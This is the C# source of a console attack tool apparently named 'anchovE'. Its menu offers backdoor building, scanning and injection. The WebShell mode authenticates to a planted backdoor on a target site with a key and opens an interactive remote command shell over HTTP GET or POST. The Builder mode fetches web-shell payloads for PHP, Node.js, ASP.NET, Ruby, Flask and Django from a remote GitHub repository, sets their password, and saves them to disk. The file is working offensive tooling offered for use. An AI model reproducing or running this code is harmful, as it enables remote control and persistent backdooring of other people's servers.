using Spectre.Console;
using System;
using System.Net;
using System.IO;
using System.Data;
using System.Xml.Linq;


public static class Program
{
    public static void Main(string[] args)
    {
       
    string banner = @"

                                                         _                ______ 
                                                        | |              |  ____|
                                         __ _ _ __   ___| |__   _____   _| |__   
                                        / _` | '_ \ / __| '_ \ / _ \ \ / /  __|  
                                       | (_| | | | | (__| | | | (_) \ V /| |____ 
                                        \__,_|_| |_|\___|_| |_|\___/ \_/ |______| by NSX Software

                                                            ";

        AnsiConsole.Markup($"[bold #107dac]{banner}[/]\n");
        var choice = AnsiConsole.Prompt(
            new SelectionPrompt<string>()
                .Title("Select Attack Type <°)))><")
             .AddChoices(new[] {
            "Backdoor Builder", "Backdoor Scanner", "WebShell",
            "Servers", "Backdoor Injector"
                }));

        if (choice == "Backdoor Scanner")
        //----------------------------------------
        {
            var url = AnsiConsole.Ask<string>("Enter Target [#107dac]URL[/] >");
            AnsiConsole.Markup($"[bold yellow][[Other]][/] Loading Files\n");
            AnsiConsole.Markup($"[bold springgreen3_1][[Scanning]][/] {url}\n");
        }
        else if (choice == "WebShell")
        {
            //----------------------------------------
            var url = AnsiConsole.Ask<string>("Enter Target [#107dac]URL[/] >");
            var webhash = AnsiConsole.Ask<string>("Enter Backdoor Hash [#107dac]URL[/] >");
            var dettype = AnsiConsole.Prompt(
            new SelectionPrompt<string>()
                .Title("Select Backdoor Detection [#107dac]Type[/]")
             .AddChoices(new[] {
            "POST","GET"
                }));
            AnsiConsole.Markup($"[bold springgreen3_1][[Scanning]][/] {url}\n");
            if (dettype == "GET")
            {
                try
                {
                    //----------------------------------------
                    var httpRequest = (HttpWebRequest)WebRequest.Create(url + "?key=" + webhash);
                    var httpResponse = (HttpWebResponse)httpRequest.GetResponse();
                    var streamReader = new StreamReader(httpResponse.GetResponseStream());
                    var result = streamReader.ReadToEnd();
                    if (result == "200 OK")
                    {
                        AnsiConsole.Markup($"[bold deepskyblue4_2][[Info]][/] Backdoor Found On {url}\n");
                        var logginurl = url + "?key=" + webhash;
                        AnsiConsole.Markup($"[bold springgreen3_1][[Connected]][/] Connected To {url} Press ctr+c To Get Out\n");
                        while (true)
                        {
                            try
                            {
                                var commandsender = AnsiConsole.Ask<string>($"{url}@shell [#107dac]>[/] ");
                                var httpRequestt = (HttpWebRequest)WebRequest.Create(url + "?key=" + webhash + "&command=" + commandsender);
                                var httpResponsee = (HttpWebResponse)httpRequestt.GetResponse();
                                var streamReaderr = new StreamReader(httpResponsee.GetResponseStream());
                                var resultt = streamReaderr.ReadToEnd();
                                AnsiConsole.Markup($"[bold deepskyblue4_2][[{url}]][/] ");
                                Console.WriteLine(resultt);
                            }
                            catch (Exception e)
                            {
                                AnsiConsole.Markup($"[bold indianred1][[Error]][/] This Command Will Make An Error On {url}\n");
                                AnsiConsole.Markup($"[bold indianred1][[Error]][/] Error ");
                                Console.WriteLine(e.ToString());
                            }
                        }
                    }
                    //----------------------------------------
                    else if (result == "403 BLOCKED")
                    {
                        AnsiConsole.Markup($"[bold yellow][[Warning]][/] Key On {url} Is Bad\n");
                        System.Environment.Exit(0);
                    }
                    else
                    {
                        AnsiConsole.Markup($"[bold indianred1][[Error]][/] Backdoor Not Found On {url}\n");
                        System.Environment.Exit(0);
                    }
                }catch(Exception e)
                {
                    AnsiConsole.Markup($"[bold indianred1][[Error]][/] Error Connecting To {url}\n");
                    AnsiConsole.Markup($"[bold indianred1][[Error]][/] Error ");
                    Console.WriteLine(e.ToString());
                }
            }
            //----------------------------------------

            else if (dettype == "POST")
            {
                //----------------------------------------
                try
                {
                    var httpRequest = (HttpWebRequest)WebRequest.Create(url);
                    httpRequest.Method = "POST";
                    httpRequest.ContentType = "application/x-www-form-urlencoded";
                    var postData = $"webhash={webhash}";
                    var data = System.Text.Encoding.UTF8.GetBytes(postData);
                    httpRequest.ContentLength = data.Length;
                    using (var stream = httpRequest.GetRequestStream())
                    {
                        stream.Write(data, 0, data.Length);
                    }
                    var httpResponse = (HttpWebResponse)httpRequest.GetResponse();
                    var streamReader = new StreamReader(httpResponse.GetResponseStream());
                    var result = streamReader.ReadToEnd();
                    if (result == "200 OK")
                    {
                        AnsiConsole.Markup($"[bold deepskyblue4_2][[Info]][/] Backdoor Found On {url}\n");
                        var logginurl = url;
                        AnsiConsole.Markup($"[bold springgreen3_1][[Connected]][/] Connected To {url} Press ctr+c To Get Out\n");
                        while (true)
                        {
                            try
                            {
                                var commandsender = AnsiConsole.Ask<string>($"{url}@shell [#107dac]>[/] ");
                                if (commandsender == "clear")
                                {
                                    AnsiConsole.Markup($"[bold indianred1][[Error]][/] This Command Will Make An Error On {url}\n");
                                    commandsender = "echo Error";
                                }
                                var httpRequestt = (HttpWebRequest)WebRequest.Create(url);
                                httpRequestt.Method = "POST";
                                httpRequestt.ContentType = "application/x-www-form-urlencoded";
                                var postDataCommand = $"webhash={webhash}&command={commandsender}";
                                var dataCommand = System.Text.Encoding.UTF8.GetBytes(postDataCommand);
                                httpRequestt.ContentLength = dataCommand.Length;
                                using (var streamCommand = httpRequestt.GetRequestStream())
                                {
                                    streamCommand.Write(dataCommand, 0, dataCommand.Length);
                                }
                                var httpResponsee = (HttpWebResponse)httpRequestt.GetResponse();
                                var streamReaderr = new StreamReader(httpResponsee.GetResponseStream());
                                var resultt = streamReaderr.ReadToEnd();
                                AnsiConsole.Markup($"[bold deepskyblue4_2][[{url}]][/] ");
                                Console.WriteLine(resultt);
                            }
                            catch (Exception e)
                            {
                                AnsiConsole.Markup($"[bold indianred1][[Error]][/] This Command Will Make An Error On {url}\n");
                                AnsiConsole.Markup($"[bold indianred1][[Error]][/] Error ");
                                Console.WriteLine(e.ToString());
                            }
                        }
                    }
                    else if (result == "403 BLOCKED")
                    {
                        AnsiConsole.Markup($"[bold yellow][[Warning]][/] Key On {url} Is Bad\n");
                        System.Environment.Exit(0);
                    }
                    else
                    {
                        Console.Write(result);
                        AnsiConsole.Markup($"[bold indianred1][[Error]][/] Backdoor Not Found On {url}\n");
                        System.Environment.Exit(0);
                    }
                }catch(Exception e)
                {
                    AnsiConsole.Markup($"[bold indianred1][[Error]][/] Error Error Connecting To {url}\n");
                    AnsiConsole.Markup($"[bold indianred1][[Error]][/] Error ");
                    Console.WriteLine(e.ToString());
                }
            }

            else
            {
                AnsiConsole.Markup($"[bold indianred1][[Error]][/] Not A Valid Method For {url}\n");
                System.Environment.Exit(0);
            }

            //----------------------------------------
        }else if(choice == "Backdoor Builder")
        {
            //"[#68a063]NodeJS[/]","[#850014]Ruby[/]","[#474A8A]PHP[/]","[#5027d5]C#/NET[/]","[#306998]Pyt[/][#FFE873]hon[/]"
            var langt = AnsiConsole.Prompt(
           new SelectionPrompt<string>()
               .Title("Select Target [#107dac]Language[/]")
            .AddChoices(new[] {
            "NodeJS","Ruby","PHP","C#/NET","Flask","Django"
               }));
            AnsiConsole.Markup($"[bold springgreen3_1][[Builder]][/] Payload Is Set To: {langt}  \n");
            void getpayload1(string lang,string method,string password)
            {
                try
                {
                    var ending = "none";
                    if (lang == "PHP")
                    {
                        ending = "php";
                    }
                    else if (lang == "NodeJS")
                    {
                        ending = "js";
                    }
                    else if (lang == "C#/NET")
                    {
                        ending = "aspx";
                    }
                    else
                    {
                        AnsiConsole.Markup($"[bold indianred1][[Error]][/] File Error\n");
                        System.Environment.Exit(0);
                    }
                    File.WriteAllText("payload.out", "");
                    var url = $"https://raw.githubusercontent.com/NSXSoftware/anchovE-Payloads/main/{method}{lang}.{ending}";
                    var httpRequest = (HttpWebRequest)WebRequest.Create(url);
                    var httpResponse = (HttpWebResponse)httpRequest.GetResponse();
                    using (var streamReader = new StreamReader(httpResponse.GetResponseStream()))
                    {
                        var result = streamReader.ReadToEnd();
                        var resu = result.Replace("admin", password);
                        File.AppendAllText("payload.out", resu);
                    }
                }
                catch
                {
                    AnsiConsole.Markup($"[bold indianred1][[Error]][/] That Payload Is Not Available\n");
                    System.Environment.Exit(0);
                }
            }
            void getpayload2(string lang,string password)
            {
                try
                {
                    var ending = "none";
                    if (lang == "Ruby")
                    {
                        ending = "rb";
                    }
                    else if (lang == "Flask")
                    {
                        ending = "py";
                    }
                    else if (lang == "Django")
                    {
                        ending = "py";
                    }
                    else
                    {
                        AnsiConsole.Markup($"[bold indianred1][[Error]][/] File Error\n");
                        System.Environment.Exit(0);
                    }
                    File.WriteAllText("payload.out", "");
                    var url = $"https://raw.githubusercontent.com/NSXSoftware/anchovE-Payloads/main/{lang}.{ending}";
                    var httpRequest = (HttpWebRequest)WebRequest.Create(url);
                    var httpResponse = (HttpWebResponse)httpRequest.GetResponse();
                    using (var streamReader = new StreamReader(httpResponse.GetResponseStream()))
                    {
                        var result = streamReader.ReadToEnd();
                        var resu = result.Replace("admin", password);
                        File.AppendAllText("payload.out", resu);

                    }
                }
                catch
                {
                    AnsiConsole.Markup($"[bold indianred1][[Error]][/] That Payload Is Not Available\n");
                    System.Environment.Exit(0);
                }
            }
           // var filename = AnsiConsole.Ask<string>("Enter [#107dac]FileName[/] >");
            //AnsiConsole.Markup($"[bold springgreen3_1][[Builder]][/] FileName Is Set To: {filename}  \n");
            AnsiConsole.Markup("Enter Backdoor [#107dac]Password [/][hotpink2][[Defualt: admin]][/] ");
            Console.Write("> ");
            var password = Console.ReadLine();
            if (string.IsNullOrWhiteSpace(password))
            {
                password = "admin";
            }
            AnsiConsole.Markup($"[bold springgreen3_1][[Builder]][/] Password Is Set To: {password}  \n");
            if (langt != "Ruby" && langt != "Django" && langt != "Flask")
            {
                var divtype = AnsiConsole.Prompt(
                    new SelectionPrompt<string>()
                        .Title("\nSelect Delivery [#107dac]Method[/]")
                        .AddChoices(new[] { "GET", "POST" })
                );
                AnsiConsole.Markup($"[bold springgreen3_1][[Builder]][/] Building A Payload for {langt} With Method {divtype}\n");
                getpayload1(langt,divtype,password);
            }
            else
            {
                AnsiConsole.Markup($"[bold springgreen3_1][[Builder]][/] Building A Payload for {langt}\n");
                getpayload2(langt,password);

            }
        }
        
    }
}
